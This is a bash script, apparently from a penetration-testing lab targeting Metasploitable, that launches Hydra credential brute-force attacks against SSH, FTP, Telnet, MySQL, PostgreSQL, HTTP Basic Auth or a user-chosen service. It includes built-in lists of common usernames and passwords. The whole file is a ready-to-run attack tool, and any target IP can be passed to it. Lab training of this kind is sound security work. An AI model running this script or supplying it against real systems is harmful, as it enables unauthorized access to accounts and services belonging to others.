#!/bin/bash
###############################################################################
# Brute Force Attacks using Hydra
# Target: Metasploitable services
###############################################################################

TARGET_IP="${1:-10.10.40.20}"
TARGET_PORT="${2:-22}"
RESULTS_DIR="${3:-.}"

source "$(dirname "$0")/../configs/wordlists.conf" 2>/dev/null || true

echo "=============================================="
echo "Brute Force Attack Suite"
echo "Target: ${TARGET_IP}"
echo "=============================================="
echo ""

# Create small wordlists if they don't exist
SMALL_PASS_FILE="${RESULTS_DIR}/small_passwords.txt"
SMALL_USER_FILE="${RESULTS_DIR}/small_users.txt"

if [[ ! -f "${SMALL_PASS_FILE}" ]]; then
    echo "Creating small password list..."
    cat > "${SMALL_PASS_FILE}" << 'EOF'
password
123456
admin
root
msfadmin
password123
letmein
welcome
monkey
dragon
master
qwerty
login
passw0rd
abc123
EOF
fi

if [[ ! -f "${SMALL_USER_FILE}" ]]; then
    echo "Creating small user list..."
    cat > "${SMALL_USER_FILE}" << 'EOF'
admin
root
msfadmin
user
test
guest
administrator
postgres
mysql
ftp
EOF
fi

echo "Select brute force target:"
echo "1) SSH (port 22)"
echo "2) FTP (port 21)"
echo "3) Telnet (port 23)"
echo "4) MySQL (port 3306)"
echo "5) PostgreSQL (port 5432)"
echo "6) HTTP Basic Auth"
echo "7) Custom service"
echo ""
read -p "Choice [1-7]: " choice

TIMESTAMP=$(date +%Y%m%d_%H%M%S)

case "$choice" in
    1)
        echo "Brute forcing SSH..."
        hydra -L "${SMALL_USER_FILE}" -P "${SMALL_PASS_FILE}" \
            "${TARGET_IP}" ssh -t 4 -V \
            -o "${RESULTS_DIR}/hydra_ssh_${TIMESTAMP}.txt"
        ;;
    2)
        echo "Brute forcing FTP..."
        hydra -L "${SMALL_USER_FILE}" -P "${SMALL_PASS_FILE}" \
            "${TARGET_IP}" ftp -t 4 -V \
            -o "${RESULTS_DIR}/hydra_ftp_${TIMESTAMP}.txt"
        ;;
    3)
        echo "Brute forcing Telnet..."
        hydra -L "${SMALL_USER_FILE}" -P "${SMALL_PASS_FILE}" \
            "${TARGET_IP}" telnet -t 4 -V \
            -o "${RESULTS_DIR}/hydra_telnet_${TIMESTAMP}.txt"
        ;;
    4)
        echo "Brute forcing MySQL..."
        hydra -L "${SMALL_USER_FILE}" -P "${SMALL_PASS_FILE}" \
            "${TARGET_IP}" mysql -t 4 -V \
            -o "${RESULTS_DIR}/hydra_mysql_${TIMESTAMP}.txt"
        ;;
    5)
        echo "Brute forcing PostgreSQL..."
        hydra -L "${SMALL_USER_FILE}" -P "${SMALL_PASS_FILE}" \
            "${TARGET_IP}" postgres -t 4 -V \
            -o "${RESULTS_DIR}/hydra_postgres_${TIMESTAMP}.txt"
        ;;
    6)
        read -p "Enter URL path (e.g., /admin): " URL_PATH
        echo "Brute forcing HTTP Basic Auth..."
        hydra -L "${SMALL_USER_FILE}" -P "${SMALL_PASS_FILE}" \
            "${TARGET_IP}" http-get "${URL_PATH}" -t 4 -V \
            -o "${RESULTS_DIR}/hydra_http_${TIMESTAMP}.txt"
        ;;
    7)
        read -p "Enter service name (e.g., smb, rdp): " SERVICE
        read -p "Enter port: " PORT
        echo "Brute forcing ${SERVICE}..."
        hydra -L "${SMALL_USER_FILE}" -P "${SMALL_PASS_FILE}" \
            -s "${PORT}" "${TARGET_IP}" "${SERVICE}" -t 4 -V \
            -o "${RESULTS_DIR}/hydra_${SERVICE}_${TIMESTAMP}.txt"
        ;;
    *)
        echo "Invalid choice"
        exit 1
        ;;
esac

echo ""
echo "Brute force attack complete. Results saved to ${RESULTS_DIR}/"
